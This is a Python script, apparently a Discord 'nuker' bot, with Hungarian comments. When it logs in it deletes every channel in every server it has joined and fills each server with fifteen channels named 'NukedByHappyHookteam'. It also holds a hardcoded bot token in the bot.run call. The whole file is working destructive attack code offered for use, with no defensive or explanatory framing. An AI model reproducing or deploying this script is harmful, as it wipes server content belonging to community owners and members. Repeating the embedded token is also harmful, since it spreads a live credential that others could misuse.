import discord
from discord.ext import commands

intents = discord.Intents.default()
intents.guilds = True

bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}!')

    for guild in bot.guilds:
        # Töröljük az összes csatornát
        for channel in guild.channels:
            await channel.delete()

        # Új csatornák létrehozása
        await guild.create_text_channel('NukedByHappyHookteam')
        await guild.create_text_channel('NukedByHappyHookteam')
        await guild.create_text_channel('NukedByHappyHookteam')
        await guild.create_text_channel('NukedByHappyHookteam')
        await guild.create_text_channel('NukedByHappyHookteam')
        await guild.create_text_channel('NukedByHappyHookteam')
        await guild.create_text_channel('NukedByHappyHookteam')
        await guild.create_text_channel('NukedByHappyHookteam')
        await guild.create_text_channel('NukedByHappyHookteam')
        await guild.create_text_channel('NukedByHappyHookteam')
        await guild.create_text_channel('NukedByHappyHookteam')
        await guild.create_text_channel('NukedByHappyHookteam')
        await guild.create_text_channel('NukedByHappyHookteam')
        await guild.create_text_channel('NukedByHappyHookteam')
        await guild.create_text_channel('NukedByHappyHookteam')

    print('Minden csatorna törölve, új csatornák létrehozva!')

bot.run('MTI5Njg0MzAyNjY5MzM2MTcwNA.GdOeMr.yjc99kZmnOvc7WjrmMxKgLeDCOH0bHzuJ3NIs8')
